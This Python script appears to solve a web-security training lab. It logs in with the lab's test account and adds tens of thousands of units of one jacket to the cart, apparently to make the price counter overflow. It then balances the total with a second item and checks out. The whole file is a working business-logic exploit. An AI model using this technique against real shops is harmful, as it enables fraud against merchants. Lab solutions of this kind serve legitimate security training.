import sys
import requests
from bs4 import BeautifulSoup
import math

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
cart_url = burp_url + '/cart'

session = requests.Session()

soup = BeautifulSoup(session.get(burp_url + "/login").text, 'html.parser')
csrf = soup.find('input', attrs={'name': 'csrf'})['value']
data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
session.post(login_url, data=data)

res = session.get(burp_url)
soup = BeautifulSoup(res.text, 'html.parser')
jacket = soup.find('img', attrs={'src': '/image/productcatalog/specialproducts/LeetLeatherJacket.jpg'})

jacket_price = jacket.parent.contents[6].strip().lstrip('$')
jacket_name = jacket.find_next_sibling('h3').text
jacket_product_id = jacket.find_next_sibling('a')['href'].split('=')[1]

next_item = jacket.parent.nextSibling.nextSibling
other_price = next_item.contents[6].strip().lstrip('$')
other_name = next_item.find_next('h3').text
other_product_id = next_item.find_next('a')['href'].split('=')[1]

for i in range(0, math.floor(32123 / 99)):
    data = {'productId': jacket_product_id, 'quantity': 99, 'redir': 'CART'}
    session.post(cart_url, data=data, allow_redirects=False)

data = {'productId': jacket_product_id, 'quantity': 32123 % 99, 'redir': 'CART'}
session.post(cart_url, data=data, allow_redirects=False)

required_amount = -math.floor(-1221.96 / float(other_price))
data = {'productId': other_product_id, 'quantity': required_amount, 'redir': 'CART'}
session.post(cart_url, data=data, allow_redirects=False)

csrf = BeautifulSoup(session.get(burp_url + "/cart").text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
data = {'csrf': csrf}
session.post(burp_url + "/cart/checkout", data=data)
